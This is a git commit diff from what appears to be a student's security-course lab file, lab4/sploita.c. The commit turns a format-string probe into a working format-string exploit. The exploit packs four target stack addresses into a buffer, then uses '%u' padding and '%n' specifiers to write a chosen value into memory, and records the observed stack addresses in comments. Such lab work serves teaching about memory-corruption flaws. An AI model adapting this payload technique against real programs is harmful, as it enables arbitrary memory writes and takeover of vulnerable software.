7bfe580a44ed21ead3f4e4e9eac7ca3636d25c62
ishanphadke <44324805+ishanphadke@users.noreply.github.com>
2020-10-23 16:14:13 -0500

    Testing sploita

--- lab4/sploita.c
+++ lab4/sploita.c
@@ -7,9 +7,14 @@
 
 int main(void)
 {
-  writecmd(PIPEPATH, "%08x!");
+  char bufr[150];
+  memcpy(bufr, "AAAdumm\xa0\x92\xbf\xbfzzzz\xa1\x92\xbf\xbfzzzz\xa2\x92\xbf\xbfzzzz\xa3\x92\xbf\xbf", 35);
+
+  strcpy(bufr+35, "%08x%165u%n%253u%n%135u%n%20u%n");
+
+  writecmd(PIPEPATH, bufr);
   
   return 0;
 }
-// esp: 0xbfbf6710
-// buf: 0xbfbf671d
+// esp: 0xbfbf08a0
+// buf: 0xbfbf08ad
